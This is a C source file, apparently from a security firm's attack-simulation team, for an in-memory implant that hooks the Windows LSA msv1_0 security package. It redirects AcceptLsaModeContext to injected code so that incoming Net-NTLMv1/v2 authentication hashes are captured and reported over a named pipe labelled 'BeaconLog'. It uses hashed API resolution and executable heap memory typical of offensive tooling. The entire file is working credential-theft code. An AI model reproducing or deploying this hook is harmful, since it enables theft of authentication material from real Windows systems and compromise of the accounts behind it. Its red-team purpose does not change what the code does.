/**
 *
 * Captures incoming Net-NTLMv1/v2 hashes
 * for incoming authentication attempts 
 * via NTLM.
 *
 * GuidePoint Security LLC
 * Threat and Attack Simulation
 *
**/

#include "common.h"

/**
 *
 * @brief:	Installs a hook on Lsa's SECPKG_FUNCTION_TABLE
 *
 * @param:	Pointer to a pipe name.
 *
**/

D_SEC( B ) VOID WINAPI InstallHook( _In_ LPVOID Parameter )
{
	API			Api;
	PROCESS_HEAP_ENTRY	Ent;

	LPVOID			Shc = NULL;
	LPVOID			End = NULL;
	LPVOID			Msv = NULL;
	LPVOID			Mgr = NULL;
	HANDLE			Log = NULL;
	SpInitializeFn	       *Spn = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PSECPKG_FUNCTION_TABLE	Sec = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Ent, sizeof( Ent ) );

	Api.CreateNamedPipeA = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_CREATENAMEDPIPEA );
	Api.ConnectNamedPipe = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_CONNECTNAMEDPIPE );
	Api.VirtualAlloc     = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_VIRTUALALLOC );
	Api.VirtualFree      = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_VIRTUALFREE );
	Api.CloseHandle      = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_CLOSEHANDLE );
	Api.HeapUnlock       = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_HEAPUNLOCK );
	Api.LocalAlloc       = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_LOCALALLOC );
	Api.WriteFile        = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_WRITEFILE );
	Api.LocalFree        = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_LOCALFREE );
	Api.HeapLock         = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_HEAPLOCK );
	Api.HeapWalk         = PeGetFuncEat( PebGetModule( H_LIB_KERNEL32 ), H_API_HEAPWALK );

	Api.vsnprintf        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_VSNPRINTF );

	Ent.lpData = NULL;
	Log = PipeInit( &Api, Parameter );
	Mgr = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
	
	if ( Log != INVALID_HANDLE_VALUE ) {
		if ( PipeWait( &Api, Log ) ) {
			if ( Api.HeapLock( Mgr ) ) {
				while ( Api.HeapWalk( Mgr, &Ent ) ) {
					if ( ( Ent.wFlags & PROCESS_HEAP_ENTRY_BUSY ) != 0 ) {
						if ( Ent.cbData >= sizeof( SECPKG_FUNCTION_TABLE ) ) {
							for ( INT Pos = 0 ; Pos != ( Ent.cbData - sizeof( SECPKG_FUNCTION_TABLE ) ) ; ++Pos ) {
								Msv = C_PTR( PebGetModule( H_LIB_MSV1_0 ) );

								if ( Msv != NULL ) {
									Dos = C_PTR( Msv );
									Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
									End = C_PTR( U_PTR( Dos ) + ( ( Nth->OptionalHeader.SizeOfImage + 0x1000 - 1 ) &~( 0x1000 - 1 ) ) );
									Spn = PeGetFuncEat( Msv, H_API_SPINITIALIZE );
									Sec = C_PTR( U_PTR( Ent.lpData ) + Pos );

									if ( Sec->Initialize == Spn ) {
										if ( ( Msv < C_PTR( Sec->AcceptLsaModeContext ) ) && ( C_PTR( Sec->AcceptLsaModeContext ) < End ) ) {
											break; /* Safe! Hook! */
										};
										PipePrint( &Api, Log, C_PTR( G_PTR( "Error: Lsa is already hooked!\n" ) ) );
									};
									Sec = NULL;
								};
							};
						};
					};
					if ( Sec != NULL ) break;
				};
				if ( Sec != NULL ) {
					if ( ( Shc = Api.VirtualAlloc( NULL, U_PTR( U_PTR( G_END( ) ) - U_PTR( G_PTR( Table ) ) ), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE ) ) ) {
						__builtin_memcpy( Shc, C_PTR( G_PTR( Table ) ), U_PTR( U_PTR( G_END( ) ) - U_PTR( G_PTR( Table ) ) ) );
						( ( PHKINFO ) Shc )->BeaconLog            = C_PTR( Log );
						( ( PHKINFO ) Shc )->SecurityPackage      = C_PTR( Sec );
						( ( PHKINFO ) Shc )->AcceptLsaModeContext = C_PTR( Sec->AcceptLsaModeContext );
						Sec->AcceptLsaModeContext = C_PTR( U_PTR( Shc ) + G_PTR( SpAcceptLsaModeContext ) - G_PTR( Table ) );
					};
				};
				Api.HeapUnlock( Mgr );
			};
			if ( Shc == NULL ) {
				Api.CloseHandle( Log );
			};
		};
	};
};
